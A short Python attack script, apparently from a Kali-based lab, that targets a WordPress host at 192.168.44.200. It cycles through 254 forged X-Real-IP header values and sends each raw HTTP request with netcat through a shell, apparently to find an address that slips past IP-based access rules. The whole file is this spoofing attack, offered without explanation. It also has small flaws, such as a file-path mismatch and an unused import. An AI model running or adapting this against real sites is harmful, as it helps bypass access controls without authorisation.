import requests
import subprocess

class color:
    OKBLUE = '\033[94m'
    ENDC = '\033[0m'

host = 0
request = 'GET / HTTP/1.1\nHost: pt.wordpress.home\nUser-Agent: Mozilla 5.0\nConnection: close\n'
ip = "X-Real-IP: 46.56.185."

while host < 254:

    host += 1
    result = (request+ip+str(host)+'\n\n')
    f = open("/home/kali/request", "w")
    f.write(result)
    f.close()
    start = subprocess.run('cat request | nc 192.168.44.200 80', shell=True, stdout=subprocess.DEVNULL)
    start.returncode
    print(color.OKBLUE + "Check host: " + color.ENDC + str(host))

print("Done")
